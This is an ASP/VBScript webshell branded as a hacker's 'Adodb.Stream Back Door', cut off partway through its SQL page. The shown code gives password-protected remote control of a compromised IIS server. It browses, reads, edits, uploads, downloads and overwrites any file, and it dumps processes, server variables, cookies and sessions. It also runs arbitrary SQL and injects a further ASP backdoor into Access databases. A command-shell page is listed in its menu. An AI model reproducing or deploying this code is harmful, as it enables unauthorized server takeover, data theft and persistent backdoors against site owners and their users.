<%@LANGUAGE="VBSCRIPT" CODEPAGE="936"%>
<object runat="server" id="ws" scope="page" classid="clsid:72C24DD5-D70A-438B-8A42-98424B88AFB8">
</object>
<object runat="server" id="ws" scope="page" classid="clsid:F935DC22-1CF0-11D0-ADB9-00C04FD58A0B">
</object>
<object runat="server" id="net" scope="page" classid="clsid:093FF999-1EA0-4079-9525-9614C3504B74">
</object>
<object runat="server" id="net" scope="page" classid="clsid:F935DC26-1CF0-11D0-ADB9-00C04FD58A0B">
</object>
<object runat="server" id="fso" scope="page" classid="clsid:0D43FE01-F093-11CF-8940-00A0C9054228">
</object>
<%
	dim url,shellStr,applicationStr,pageName,startTime

	shellStr="Shell"
	applicationStr="Application"

	startTime=timer()
	session.timeout=40
	pageName=request("pageName")
	url=request.serverVariables("url")

	const m="51j"
	const mVersion="4.00"
	const userPassword="nohack" '登录密码
	const adminPassword="nohack" '二次密码
	const clientPassword="nohack" '客户端密码,如果要插入数据库,则只能设置一位,请只使用数字和字母的组合
	const sqlMaxLoopI=100
	const notdownloadsExists=false
	const myCmdDotExeFile="command.exe" '自己的cmd.exe文件名,如果不方便改源程序,执行时要在路径后面多加上 /c 
	const editableFileExt="$log$asp$txt$php$ini$inc$htm$html$xml$conf$config$jsp$java$htt$bat$lst$aspx$php3$php4$js$css$bat$asa$"
	
	rem +--------------------------------------+
	rem |	    这下面是页面的公共函数部分	   |
	rem +--------------------------------------+
	
	sub echo(str)
		response.write(str)
	end sub
	
	sub onErr(str)
		response.write("出错信息: "&str&"")
		response.end()
	end sub
	
	sub isIn(flag)
		if flag=1 then
			if session(m&"userPassword")<>userPassword then
				echo "<script language=""javascript"">alert('对不起,没有权限的操作,请先登录!');location.href='?pageName=default';</script>"
				response.end
			end if
		 else
		 	isIn(1)
			if session(m&"adminPassword")<>adminPassword then
				echo "<script language=""javascript"">if(confirm('此操作要求二次鉴权\n现在进行这项操作吗?')){location.href='?pageName=login';}else{history.back();}</script>"
				response.end
			end if
		end if
	end sub
	
	function getTheSize(str)
		dim theSize
		theSize=str
		if theSize>=(1024*1024*1024) then getTheSize=fix((theSize/(1024*1024*1024))*10)/10&" G"
		if theSize>=(1024*1024) and theSize<(1024*1024*1024) then getTheSize=fix((theSize/(1024*1024))*10)/10&" M"
		if theSize>=1024 and theSize<(1024*1024) then getTheSize=fix((theSize/1024)*10)/10&" K"
		if theSize>=0 and theSize <1024 then getTheSize=theSize&" B"
	end function
	
	function getStrLen(str)
		dim i
		getStrLen=0
		for i=1 to len(str)
			if asc(mid(str,i,1))>0 and asc(mid(str,i,1))<256 then
				getStrLen=getStrLen+1
			 else
				getStrLen=getStrLen+2
			end if
		next
	end function
	
	function getCutStr(str,n)
		dim i,j
		if n>len(str) then
			n=len(str)
		end if
		for i=1 to n
			if asc(mid(str,i,1))<=0 or asc(mid(str,i,1))>=256 then
				j=j+1
			end if
		next
		getCutStr=left(str,n-j)
	end function
	
	sub redirectTo(url)
		response.redirect(url)
	end sub
	
	sub showTitle(str)
		response.write("<title>"&str&" - 騎牛追飛機 - HaCkEd_By_騎牛追飛機</title>")
	end sub
	
	function getParentFolder(thePath)
		dim path
		path=thePath
		if right(path,1)="\" then
			path=left(path,len(path)-1)
		end if

		if instr(path,"\")>0 then
			getParentFolder=left(path,instrRev(path,"\"))
		 else
			getParentFolder=""
		end if
	end function
	
	sub chkErr(err,message)
		if err then
			err.clear
			response.write "<script language=""javascript"">alert('"&message&"');</script>"
			response.end
		end if
	end sub
	
	function encodeForUrl(str,flag)
		if flag=true then
			encodeForUrl=replace(str,"\","\\")
		 else
			encodeForUrl=str
		end if
		encodeForUrl=replace(encodeForUrl,"%","%25")
		encodeForUrl=replace(encodeForUrl,"#","%23")
		encodeForUrl=replace(encodeForUrl,"&","%26")
	end function
	
	function fixNull(str)
		if isNull(str) then
			fixNull=""
		 else
			fixNull=str
		end if
	end function
	
	sub streamUpload(thePath,fileName)
		dim i,j,info,stream,streamT,theFile,overWrite,fileContent
		theFile=request("theFile")
		overWrite=request("overWrite")
		if lcase(thePath)=lcase(fileName) then
			fileName=thePath&"\"&split(theFile,"\")(uBound(split(theFile,"\")))
		end if
		if instr(fileName,":") then
			fileName=fileName
		 else
			fileName=thePath&"\"&fileName
		end if
		server.scriptTimeOut=5000
		set stream=server.createObject("adodb.stream")
		set streamT=server.createObject("adodb.stream")
		
		with stream
			.type=1
			.mode=3
			.open
			.write request.binaryRead(request.totalBytes)
			.position=0
			fileContent=.read()
			i=instrB(fileContent,chrB(13)&chrB(10))
			info=leftB(fileContent,i-1)
			i=len(info)+2
			i=instrB(i,fileContent,chrB(13)&chrB(10)&chrB(13)&chrB(10))+4-1
			j=instrB(i,fileContent,info)-1
			streamT.Type=1
			streamT.Mode=3
			streamT.Open
			stream.position=i
			.copyTo streamT,j-i-2

			on error resume next
			if overWrite="true" then
				streamT.saveToFile fileName,2
			 else
				streamT.saveToFile fileName
			end if
			chkErr err,err.description&"\n文件名忘记填写了吗?\n还是文件(夹)已经存在了?');history.back('"
			echo "<script language=""javascript"">alert('文件上传成功!\n"&replace(fileName,"\","\\")&"');</script>"

			streamT.close
			.close
		end with

		set stream=nothing
		set streamT=nothing
	end sub	

	rem +-------------------------------+
	rem |		下面是页面代码选择		|
	rem +-------------------------------+
	
	if pageName<>"stream" then
		pageOther()
		showMenu()
	end if
	
	select case pageName
		case "","default"
			pageDefault()
		case "server"
			pageServer()
		case "stream"
			pageStream()
		case "sql"
			pageSql()
		case "fso"
			pageFso()
		case "upload"
			pageUpload()
		case "cmdShell"
			pageCmdShell()
		case "login"
			pageLogin()
		case "app"
			pageApp()
	end select

	rem +-------------------------------+
	rem |		下面是各独立功能代码		|
	rem +-------------------------------+

	sub pageDefault()
		dim theAct,password
		theAct=request("theAct")
		password=request("password")
		if theAct="chkLogin" then
			if password=userPassword then
				session(m&"userPassword")=userPassword
				redirectTo(url&"?pageName=server")
			 else
				redirectTo(url&"?pageName=default")
			end if
		end if
		
		showTitle("管理登录")
		echo "<body onload=""formx.password.focus();"">"
%>
<div align="center" style="position:absolute;width:100%;visibility:show; z-index:0;left:0px;top:200px">
	<TABLE class="table1" cellSpacing="1" cellPadding="1" width="473" border="0" align="center">
		<tr>
			<td class="tr1">
				<TABLE cellSpacing="0" cellPadding="0" width="468" border="0">
					<tr>
						<TD><FONT face="webdings" color="#ffffff">&nbsp;8</FONT><FONT face="Verdana, Arial, Helvetica, sans-serif" color="#ffffff"><b>管理登录 
									:::...</b></TD>
						<TD align="right"><FONT color="#d2d8ec">騎牛追飛機专用——QQ：138008880美化版</FONT></TD>
					</tr>
					<form name="formx" method="post" action="?pageName=default&theAct=chkLogin" onSubmit="return default_canLogin(this);">
						<tr>
							<td height="30" align="center" class="td2" colspan="2">
								<input name="password" type="password" class="inputLogin" id="Password" style="background-color:#ffffff;">
								<input type="submit" name="Submit" value="LOGIN" class="inputLogin">
							</td>
						</tr>
					</form>
					<SCRIPT type='text/javascript' language='javascript' src='http://xslt.alexa.com/site_stats/js/t/c?url=<%=request.serverVariables("server_name")%>'></SCRIPT>
				</TABLE>
			</td>
		</tr>
	</TABLE>
</div>
<%
		echo "</body>"
	end sub

	sub pageLogin()
		dim theAct,password
		isIn(1)
		theAct=request("theAct")
		password=request("password")
		if theAct="chkLogin" then
			if password=adminPassword then
				session(m&"adminPassword")=adminPassword
				redirectTo(url&"?pageName=stream")
			 else
				redirectTo(url&"?pageName=login")
			end if
		end if
				
		showTitle("管理登录")
		echo "<body onload=""formx.password.focus();"">"
%>
<div align="center" style="position:absolute;width:100%;visibility:show; z-index:0;left:0px;top:200px">
	<TABLE class="table1" cellSpacing="1" cellPadding="2" width="405" border="0" align="center">
		<tr>
			<td class="tr1">
				<TABLE cellSpacing="0" cellPadding="0" width="400" border="0">
					<tr>
						<TD><FONT face="webdings" color="#ffffff">&nbsp;8</FONT><FONT face="Verdana, Arial, Helvetica, sans-serif" color="#ffffff"><b>管理密码验证 
									:::...</b></TD>
						<TD align="right"><FONT color="#d2d8ec">騎牛追飛機专用——QQ：138008880美化版</FONT></TD>
					</tr>
					<form name="formx" method="post" action="?pageName=login&theAct=chkLogin" onSubmit="return default_canLogin(this);">
						<tr>
							<td height="30" align="center" class="td2" colspan="2">
								<input name="password" type="password" class="inputLogin" id="Password" style="background-color:#ffffff;">
								<input type="submit" name="Submit" value="LOGIN" class="inputLogin">
							</td>
						</tr>
					</form>
				</TABLE>
			</td>
		</tr>
	</TABLE>
</div>
<%
		echo "</body>"
	end sub

	sub pageStream()
		isIn(2)
		dim theAct,thePath,toPath,fileName
		theAct=request("theAct")
		toPath=request("toPath")
		thePath=request("thePath")
		fileName=request("fileName")
		
		if thePath="" then
			thePath=server.mapPath(".")
		end if
	
		select case theAct
			case "save"
				streamEditFile(thePath)
				response.end
			case "down"
				downTheFile(thePath)
				response.end
			case "saveAsTwo"
				saveAsTwo thePath,toPath
				response.end
		end select

		showTitle("流操作页面")
		pageOther()
		showMenu()
		
		select case theAct
			case "edit"
				streamEditFile(thePath)
				response.end
			case "upload"
				streamUpload thePath,fileName
				echo "<script language=""javascript"">location.href='?pageName=stream&thePath="&encodeForUrl(thePath,true)&"';</script>"
				response.end
		end select
%>
<TABLE cellSpacing="0" cellPadding="0" width="100%" border="0" ID="Table1">
	<tr>
		<TD class="tr1" colspan="2"><FONT face="webdings" color="#ffffff">&nbsp;8</FONT><FONT face="Verdana, Arial, Helvetica, sans-serif" color="#ffffff"><b><%=request.serverVariables("server_name")%>- 
					Adodb.Stream Back Door :::...</b></TD>
	</tr>
	<form method="post" onSubmit="this.Submit3.disabled=true;" action="?pageName=stream">
		<tr>
			<td class="td1" colspan="2">
				&nbsp;服务器路径: <input name="thePath" type="text" id="Text1" value="<%=thePath%>" size="60">
				<input type="button" name="Submit3" value="查看" onclick="location.href='?pageName=stream&thePath='+this.form.thePath.value;this.disabled=true;"
					ID="Button1">
			</td>
		</tr>
	</form>
	<form method="post" enctype="multipart/form-data" action="?pageName=stream&theAct=upload&thePath=<%=encodeForUrl(thePath,false)%>" onsubmit="return upload_canSubmit(this);">
		<tr>
			<td class="td1" colspan="2">
				<input name="file" type="file" size="25" ID="File1">保存为<input name="fileName" type="text" value="<%=thePath%>" size="35" ID="Text2">
				<input name="Submit" type="submit" id="Submit1" value="上传" onClick="this.form.action+='&theFile='+this.form.file.value+'&overWrite='+this.form.writeMode.checked;">
				<input type="checkbox" name="writeMode" value="True" ID="Checkbox1">覆盖模式
			</td>
		</tr>
	</form>
	<tr>
		<td class="td2" valign="top" width="30%"><%call streamGetFolderList(thePath,true)%></td>
		<td class="td2" valign="top" width="70%">
			<table width="100%" border="0" cellpadding="0" cellspacing="0" class="table1o1" ID="Table2">
				<tr align="center">
					<td class="td1" width="40%">文件名</td>
					<td class="td1" width="35%">文件操作</td>
					<td class="td1" width="15%">文件大小</td>
				</tr>
				<%call streamGetFolderList(thePath,false)%>
			</table>
		</td>
	</tr>
	<tr>
		<td class="td1" colspan="2"><div id="loaded" style="display:none"><iframe id="fileEditor" frameborder="0" scrolling="no" valign="top" width="100%" height="380"></iframe></div>
		</td>
	</tr>
</TABLE>
<a name="foot"></a>
<%
	end sub
	
	sub streamEditFile(thePath)
		dim fileName,fileContent,userCharset
		fileName=thePath
		userCharset=request("userCharset")
		
		if request("theAct")="save" then
			fileContent=request("fileContent")
			streamWriteToFile thePath,fileContent
			response.end
		end if
		
		fileContent=streamReadFromFile(fileName,request("userCharset"))
%>
<table border="0" align="center" cellpadding="1" cellspacing="1">
	<form method="post" action="?pageName=stream&theAct=save" onsubmit="if(confirm('您确认要保存当前文件吗?')){this.Submit.disabled=true;this.Submit2.disabled=true;this.Submit3.disabled=true;}else{return false;}">
		<tr>
			<td><textarea name="fileContent" cols="100" rows="25" id="fileContent"><%=server.htmlEncode(fileContent)%></textarea></td>
		</tr>
		<tr>
			<td height="20" align="right">
				<font color="red">非GB2312编码文件可能无法正确保存!</font> <input name="thePath" type="hidden" value="<%=thePath%>">
				<input name="userCharset" type="text" value="<%=userCharset%>" size="10"> <input type="button" value="重新编码" name="Submit3" onclick="location.href='?<%=replace("pageName=stream&thePath="&thePath&"&theAct=edit","\","\\")%>&userCharset='+this.form.userCharset.value;this.disabled=true;">
				<input type="button" name="Submit" value="保 存" onClick="if(confirm('确认保存修改?')){this.form.submit();}">
				<input type="button" name="Submit2" value="另存为" onclick="stream_saveAs(this.form,'<%=encodeForUrl(thePath,true)%>');">
			</td>
		</tr>
	</form>
</table>
<a name="foot"></a>
<%
	end sub
	
	sub streamGetFolderList(thePath,showFolder)
		dim sa,ext,flag,list,folders,theHref
		set sa=server.createObject(shellStr&"."&applicationStr)

		if len(thePath)=2 then
			thePath=thePath&"\"
		end if

		set folders=sa.namespace(thePath)

		if showFolder=true and getParentFolder(thePath)<>"" then
			echo "&nbsp;<a href=""?pageName=stream&thePath="&encodeForUrl(getParentFolder(thePath),false)&"""><font color=red>↑上级目录</font></a><br>"
		end if

		on error resume next
		for each list in folders.items
			if showFolder=true and list.isfolder Then
				echo "&nbsp;<a href=""?pageName=stream&thePath="&encodeForUrl(list.path,false)&"""><FONT face=wingdings color=red>0</FONT>&nbsp;"
				echo replace(replace(lcase(list.path),lcase(thePath),""),"\","")
				echo "</a><br>"
			 else
				if showFolder=false and (not list.isfolder) Then
					ext=split(list.path,".")(uBound(split(list.path,".")))
					flag=instr(lcase(editableFileExt),lcase("$"&ext&"$"))
					if instr(lcase(list.path),lcase(server.mapPath("."))) then
						theHref=""
						theHref=mid(theHref&replace(lcase(list.path),lcase(server.mapPath(".")),""),2)
						echo "<tr><td class=""td3"">&nbsp;<a href="""&theHref&""" target=_blank>"&replace(replace(lcase(list.path),lcase(thePath),""),"\","")&"</td>"
					 else
						echo "<tr><td class=""td3"">&nbsp;"&replace(replace(lcase(list.path),lcase(thePath),""),"\","")&"</td>"
					end if
					echo "<td class=""td3"" align=center><a href=javascript:; onclick=""stream_downIt('"&encodeForUrl(list.path,true)&"');""><font color=red>Down</font></a>-"
					if flag>0 then
						echo "<a href=#foot onclick=""stream_editIt('"&encodeForUrl(list.path,true)&"');""><font color=red>Edit</font></a>-"
					end if
					echo "<a href=javascript:; onclick=""stream_saveAsTwo('"&encodeForUrl(list.path,true)&"');""><font color=red>SaveAs</font></a>"
					echo "</td><td class=""td3"" align=right>"&getTheSize(list.size)
					echo "&nbsp;</td></tr>"
				end if
			end if
		next
		if err then
			onErr err.description
		end if
	end sub
	
	sub downTheFile(thePath)
		dim stream,fileName,fileContentType
		fileName=split(thePath,"\")(uBound(split(thePath,"\")))
		set stream=server.createObject("adodb.stream")
		stream.open
		stream.type=1
		stream.loadFromFile(thePath)
		fileContentType=getContentType(fileName)
		response.addHeader "Content-Disposition", "attachment; filename=" & fileName
		response.addHeader "Content-Length",stream.Size
		response.charset="UTF-8"
		response.contentType=fileContentType
		response.binaryWrite stream.read 
		response.flush
		stream.close
		set stream=nothing
	end sub
	
	function getContentType(fileName)
		select case split(fileName,".")(uBound(split(fileName,".")))
			case "asf"
				getContentType="video/x-ms-asf"
			case "avi"
				getContentType="video/avi"
			case "doc"
				getContentType="application/msword"
			case "zip"
				getContentType="application/zip"
			case "xls"
				getContentType="application/vnd.ms-excel"
			case "gif"
				getContentType="image/gif"
			case "jpg", "jpeg"
				getContentType="image/jpeg"
			case "wav"
				getContentType="audio/wav"
			case "mp3"
				getContentType="audio/mpeg3"
			case "mpg", "mpeg"
				getContentType="video/mpeg"
			case "rtf"
				getContentType="application/rtf"
			case "htm", "html"
				getContentType="text/html"
			case "txt","js"
				getContentType="text/plain"
			case else
				getContentType="application/octet-stream"
		end select
	end function
	
	sub saveAsTwo(thePath,toPath)
		on error resume next
		dim stream
		if lTrim(thePath)=lTrim(toPath) then
			echo "<script>alert('源路径与目标路径相同,操作停止!');</script>"
			response.end
		end if
		set stream=server.createObject("adodb.stream")
		stream.type=1
		stream.open
		stream.loadFromFile thePath
		chkErr err,err.description
		stream.saveToFile toPath,2
		echo "<script language=""javascript"">alert('另存为操作成功!');</script>"
		set stream=nothing
	end sub
	
	function streamReadFromFile(thePath,userCharset)
		dim stream
		set stream=server.createObject("adodb.stream")
		with stream
			.type=2
			.mode=3
			.open
			on error resume next
			.loadFromFile thePath
			chkErr err,"文件无法被打开,请重试!"
			if userCharset<>"" then
				.charset=userCharset
			 else
				.charset="gb2312"
			end if
			chkErr err,"编码类型错误!<a href=""javascript:history.back();"">[返回]</a>"
			.Position=2
			streamReadFromFile=.readText()
			.close
		end with
		set stream=nothing
	end function
	
	sub streamWriteToFile(thePath,fileContent)
		dim stream
		set stream=server.createObject("adodb.stream")
		with stream
			.type=2
			.mode=3
			.open
			.charset="gb2312"
			.writeText fileContent
			.saveToFile thePath,2
			.close
		end with
		set stream=nothing
		echo "文件保存成功! [<a href="""&request.serverVariables("http_referer")&""">返回</a>]"
	end sub

	sub pageServer()
		dim i
		isIn(1)
		showTitle("服务器相关数据")
%>
<table width="100%" border="0" cellpadding="0" cellspacing="0" class="table1" ID="Table3">
	<tr>
		<TD class="tr1"><FONT face="webdings" color="#ffffff">&nbsp;8</FONT><FONT color="#ffffff"><b><%=request.serverVariables("server_name")%>-AspINFO 
					:::...</b></TD>
	</tr>
</table>
<table width="100%" border="0" cellpadding="0" cellspacing="0" class="table2" ID="Table4">
	<tr>
		<td colspan="2" class="td1"><FONT face="webdings">&nbsp;8</FONT>&nbsp;进程 :::...</td>
	</tr>
	<%
		on error resume next
		
		set domainObject = GetObject("WinNT://.")
		
		for each obj in domainObject
		if lcase(mid(obj.path,4,3))="win" then
				N1=N1&"<tr><td width=""150"" class=""td2"">&nbsp;"&obj.Name&"</td><td class=""td3"">&nbsp;"&obj.DisplayName &"</td></tr>"&"<tr><td class=""td3""></td><td class=""td1"">&nbsp;"&obj.path&"</td></tr>"
			else
				N2=N2&"<tr><td width=""150"" class=""td2"">&nbsp;"&obj.Name&"</td><td class=""td3"">&nbsp;"&obj.DisplayName &"</td></tr>"&"<tr><td class=""td3""></td><td class=""td1"">&nbsp;<font color=#FF0000>"&obj.path& "</font></td></tr>"
			end if
		next
		
		set domainObject=nothing

		Response.write(N2)
		Response.write(N1)
	%>
</table>
<table width="100%" border="0" cellpadding="0" cellspacing="0" class="table2" ID="Table22">
	<tr>
		<td colspan="2" class="td1"><FONT face="webdings">&nbsp;8</FONT>&nbsp;Server 
			Variables :::...</td>
	</tr>
	<%
		Dim strVariable, strASPVersion
		Dim strCookie, strKey, strSession

		strASPVersion = ScriptEngine & " Version " & _	
		ScriptEngineMajorVersion & "." & _ 
		ScriptEngineMinorVersion
	%>
	<%
		For Each strVariable In Request.ServerVariables
			Response.write("<tr><td width=""150"" class=""td2"" valign=top>&nbsp;" & strVariable & "</td>")
			Response.write("<td class=""td3"">&nbsp;" & Request.ServerVariables(strVariable) & "&nbsp;</td></tr>")
		Next
	%>
	<tr>
		<td colspan="2" class="td1"><FONT face="webdings">8</FONT>&nbsp;Cookies :::...</td>
	</tr>
	<%
		For Each strCookie In Request.Cookies
			If Not Request.Cookies(strCookie).HasKeys Then
				Response.write("<tr><td width=""150"" class=""td2"" valign=top>&nbsp;" & strCookie & "</td>")
				Response.write("<td class=""td3"">&nbsp;" & Request.Cookies(strCookie) & "&nbsp;</td></tr>")
			Else
				For Each strKey In Request.Cookies(strCookie)
					Response.write("<tr><td width=""150"" class=""td2"" valign=top>&nbsp" & strCookie & "(" & strKey & ")</td>")
					Response.write("<td class=""td3"">&nbsp;" & Request.Cookies(strCookie)(strKey) & "&nbsp;</td></tr>")
				Next
			End If
		Next
	%>
	<tr>
		<td colspan="2" class="td1"><FONT face="webdings">8</FONT>&nbsp;Session Cookies 
			:::...</td>
	</tr>
	<%
		For Each strSession In Session.Contents
			Response.write("<tr><td width=""150"" class=""td2"" valign=top>&nbsp;" & strSession & "</td>")
			Response.write("<td class=""td3"">&nbsp;" & Session(strSession) & "</td></tr>")
		Next
	%>
	<tr>
		<td colspan="2" class="td1"><FONT face="webdings">8</FONT>&nbsp;Other variables 
			:::...</td>
	</tr>
	<tr>
		<td width="150" class="td2" valign="top">&nbsp;Session.sessionid</td>
		<td class="td3">&nbsp;<%= Session.sessionid %></td>
	</tr>
	<tr>
		<td width="150" class="td2" valign="top">&nbsp;Server.MapPath</td>
		<td class="td3">&nbsp;<%= Server.MapPath ("/") %></td>
	</tr>
	<tr>
		<td width="150" class="td2" valign="top">&nbsp;服务器操作系统</td>
		<td class="td3">&nbsp;<%=request.serverVariables("OS")%></td>
	</tr>
	<tr>
		<td width="150" class="td2" valign="top">&nbsp;IIS版本</td>
		<td class="td3">&nbsp;<%=Request.ServerVariables("SERVER_SOFTWARE")%></td>
	</tr>
	<tr>
		<%
			dim t1,t2,lsabc,thetime
			t1=timer
			for i=1 to 500000
				lsabc=1+1
			next
			t2=timer
			thetime=cstr(int(((t2-t1)*10000)+0.5)/10)
		%>
		<td width="150" class="td2" valign="top">&nbsp;服务器运算速度测试</td>
		<td class="td3">&nbsp;<%=thetime%>毫秒(50万次1+1运算所需时间)</td>
	</tr>
</table>
<%
	end sub

	sub pageSql()
		isIn(2)
		dim theAct,sqlStr
		theAct=request("theAct")
		sqlStr=request("sqlStr")
		
		showTitle("mdb+mssql数据库操作页")
		
		if sqlStr="" then
			if session(m&"sqlStr")="" then
				sqlStr="e:\hytop.mdb或sql:Provider=SQLOLEDB.1;Server=localhost;User ID=sa;Password=haiyangtop;Database=bbs;"
			 else
				sqlStr=session(m&"sqlStr")
			end if
		end if
		session(m&"sqlStr")=sqlStr
%>
<TABLE class="table1" cellSpacing="1" cellPadding="1" width="100%" border="0" ID="Table10">
	<tr>
		<td class="tr1">
			<TABLE cellSpacing="0" cellPadding="0" width="100%" border="0" ID="Table12">
				<form method="post" action="?pageName=sql&theAct=showTables" onsubmit="this.Submit.disabled=true;"
					ID="Form1">
					<tr>
						<TD><FONT face="webdings" color="#ffffff">&nbsp;8</FONT> <b><a href="?pageName=sql">Mdb+MsSQL数据库操作 
									:::...</a></b></TD>
					</tr>
					<tr>
						<td class="td1">
							<input name="sqlStr" type="text" id="Text3" value="<%=sqlStr%>" size="80" onFocus="this.value=''">
							<input type="submit" name="Submit" value="浏览" ID="Submit2"> <input type="button" name="Submit2" value="插入" onclick="if(confirm('如果ACESS数据库是asp后缀,并且没有错乱asp代码,这里可以插入冰狐浪子ASP后门,默认密码是#\n确认操作吗?')){location.href='?pageName=sql&theAct=inject&sqlStr='+this.form.sqlStr.value;this.disabled=true;}"
								ID="Button2">
						</td>
					</tr>
					<tr>
						<td class="td2" colspan="2" align="center"><b><FONT color="red">提示：</FONT>插入只针对ACESS数据库操作! 
								要浏览ACESS在表单中的写法是"路径+数据库文件名"! SQL据库写法是,sql:连接字符串(不要忘写sql)!下边是例子.</b><br>
							<FONT color="red">sql:Provider=SQLOLEDB.1;Server=localhost;User 
								ID=sa;Password=pass;Database=bbs;</FONT></td>
					</tr>
				</form>
			</TABLE>
		</td>
	</tr>
</TABLE>
<%
		select case theAct
			case "showTables"
				showTables()
			case "query"
				showQuery()
			case "inject"
				accessInject()
		end select
	
	end sub
	
	sub showTables()
		dim conn,sqlStr,rsTable,rsColumn,connStr,tablesStr,loopI
		sqlStr=request("sqlStr")
		if lcase(left(sqlStr,4))="sql:" then
			connStr=mid(sqlStr,5)
		 else
			connStr="Provider=Microsoft.Jet.Oledb.4.0;Data Source="&sqlStr
		end if
		set conn=server.createObject("adodb.connection")
		
		on error resume next
		conn.open connStr
		chkErr err,"无法打开: "&sqlStr
		
		set rsTable=conn.openSchema(20,array(empty,empty,empty,"table"))

		do until rsTable.eof
			tablesStr=tablesStr&"&nbsp;<a href=""?pageName=sql&theAct=query&sqlStr="&encodeForUrl(sqlStr,false)&"&theTable="&enCodeForUrl(rsTable("Table_Name"),false)&""">"&rsTable("Table_Name")&"</a><br>"
			rsTable.moveNext
		loop
		rsTable.moveFirst
%>
<table width="100%" border="0" align="center" cellpadding="1" cellspacing="1" ID="Table5">
	<tr>
		<td colspan="2" class="td1"><FONT face="webdings" color="#ffffff">&nbsp;8</FONT><b><a href="?pageName=sql&theAct=showTables&sqlStr=<%=encodeForUrl(sqlStr,false)%>">数据库表结构查看</a>
				:::..</b></td>
	</tr>
	<tr>
		<td valign="top" class="td2"><%=tablesStr%></td>
		<td valign="top" class="td1">
			<FONT face="webdings">8</FONT><b><a href="<%="?pageName=sql&theAct=query&sqlStr="&encodeForUrl(sqlStr,false)&""%>">转到SQL命令执行</a>
				:::.</b>.
			<%
					do until rsTable.eof
						set rsColumn=conn.openSchema(4,array(empty,empty,rsTable("Table_Name").value))
			%>
			<table width="100%" border="0" cellpadding="1" cellspacing="1" ID="Table6">
				<tr>
					<td colspan="6" class="td1o2"><b><FONT face="webdings">8</FONT>&nbsp;<%=rsTable("Table_Name")%>&nbsp;:::..</b></td>
				</tr>
				<tr align="center">
					<td class="td1">字段名</td>
					<td class="td1">类型</td>
					<td class="td1">大小</td>
					<td class="td1">精度</td>
					<td class="td1">允许为空</td>
					<td class="td1">默认值</td>
				</tr>
				<%
					loopI=0
					do until rsColumn.eof
						loopI=loopI+1
						if loopI>sqlMaxLoopI then
							exit do
						end if
				%>
				<tr align="center">
					<td align="left" class="td2">&nbsp;<%=rsColumn("Column_Name")%></td>
					<td width="80" class="td2"><%=getDataType(rsColumn("Data_Type"))%></td>
					<td width="70" class="td2"><%=rsColumn("Character_Maximum_Length")%></td>
					<td width="70" class="td2"><%=rsColumn("Numeric_Precision")%></td>
					<td width="70" class="td2"><%=rsColumn("Is_Nullable")%></td>
					<td width="80" class="td2"><%=rsColumn("Column_Default")%></td>
				</tr>
				<%
						rsColumn.moveNext
					loop
				%>
			</table>
			<%
					rsTable.moveNext
				loop
			%>
		</td>
	</tr>
</table>
<%
		conn.close
		set conn=nothing
		set rsTable=nothing
		set rsColumn=nothing
	end sub
	
	sub showQuery()
		dim i,j,rs,sql,page,conn,sqlStr,connStr,rsTable,tablesStr,theTable
		sql=request("sql")
		page=request("page")
		sqlStr=request("sqlStr")
		theTable=request("theTable")
		
		if not isNumeric(page) or page="" then
			page=1
		end if
		
		if sql="" and theTable<>"" then
			sql="select top 10 * from ["&theTable&"]"
		end if
		
		if lcase(left(sqlStr,4))="sql:" then
			connStr=mid(sqlStr,5)
		 else
			connStr="Provider=Microsoft.Jet.Oledb.4.0;Data Source="&sqlStr
		end if
		set rs=server.createObject("adodb.recordSet")
		set conn=server.createObject("adodb.connection")
	
		on error resume next
		conn.open connStr
		chkErr err,"无法打开: "&sqlStr
		
		set rsTable=conn.openSchema(20,array(empty,empty,empty,"table"))

		do until rsTable.eof
			tablesStr=tablesStr&"<br>&nbsp;<a href=""?pageName=sql&theAct=query&sqlStr="&encodeForUrl(sqlStr,false)&"&theTable="&encodeForUrl(rsTable("Table_Name"),false)&""">"&rsTable("Table_Name")&"</a>"
			rsTable.moveNext
		loop
%>
<table width="100%" border="0" align="center" cellpadding="1" cellspacing="1" ID="Table13">
	<tr>
		<td colspan="2" class="td1"><FONT face="webdings" color="#ffffff">&nbsp;8</FONT><b><a href="?pageName=sql&theAct=query&sqlStr=<%=encodeForUrl(sqlStr,false)%>&sql=<%=enCodeForUrl(sql,false)%>">SQL命令执行及查看</a>
				:::..</b></td>
	</tr>
	<form method="post" action="?pageName=sql&theAct=query&sqlStr=<%=encodeForUrl(sqlStr,false)%>" ID="Form2">
		<tr>
			<td valign="top" class="td2" width="30%"><%=tablesStr%></td>
			<td valign="top" class="td1"><FONT face="webdings">8</FONT><b><a href="?pageName=sql&theAct=showTables&sqlStr=<%=encodeForUrl(sqlStr,false)%>">数据库表结构查看</a>
					:::..</b>
				<table width="100%" border="0" cellpadding="1" cellspacing="1">
					<tr class="td3">
						<td class="td3">
							<input name="sql" type="text" id="sql" value="<%=sql%>" style='width:80%'> <input type="submit" name="Submit4" value="查询" ID="Submit3">
							<%
		if sql<>"" and left(lcase(sql),7)="select " then
			rs.open sql,conn,1,1
			chkErr err,"错误信息: "&err.description
			rs.pageSize=20
			if not rs.eof then
				rs.absolutePage=page
			end if
			if rs.fields.count>0 then
				echo "<table border=""0"" cellpadding=""0"" cellspacing=""0"" width=""100%"">"
				echo "<tr><td class=""tr1"" colspan="""&rs.fields.count&"""><b><FONT face=""webdings"" color=""#ffffff"">&nbsp;8</FONT>&nbsp;<FONT color=""#ffffff"">SQL操作 - 执行结果 :::..</FONT></b></td></tr>"
				for j=0 to rs.fields.count-1
					echo "<td class=""td1"">&nbsp;"&rs.fields(j).name&"</td>"
				next
				for i=1 to 20
					if rs.eof then
						exit for
					end if
					echo "</tr>"
					echo "<tr valign=top>"
					for j=0 to rs.fields.count-1
						echo "<td align=""center"" class=""td2"">"&server.htmlEncode(fixNull(rs(j)))&"</td>"
					next
					echo "</tr>"
					rs.movenext
				next
			end if
			echo "<tr><td align=""center"" class=""td2"" colspan="""&rs.fields.count&""">"
			for i=1 to rs.pagecount
				echo replace("<a href=""?pageName=sql&theAct=query&sqlStr="&encodeForUrl(sqlStr,false)&"&sql="&sql&"&page="&i&"""><font {$font"&i&"}>"&i&"</font></a> ","{$font"&page&"}","class=warningColor")
			next
			echo "</td></tr></table>"
			rs.close
		 else
		 	if sql<>"" then
				on error resume next
				conn.execute(sql)
				chkErr err,"SQL语句错误: "&sql
				echo "<center><br>执行完毕!</center>"
			end if
		end if
%>
						</td>
					</tr>
					<tr>
						<td>
							<table width="100%" border="1" cellpadding="1" cellspacing="1" ID="Table21">
								<tr>
									<td class="td1" width="10" valign="middle"><FONT color="red">基本命令</FONT></td>
									<td class="td2">
										&nbsp;显示数据 = SELECT * FROM [TableName] WHERE ID<100<br>
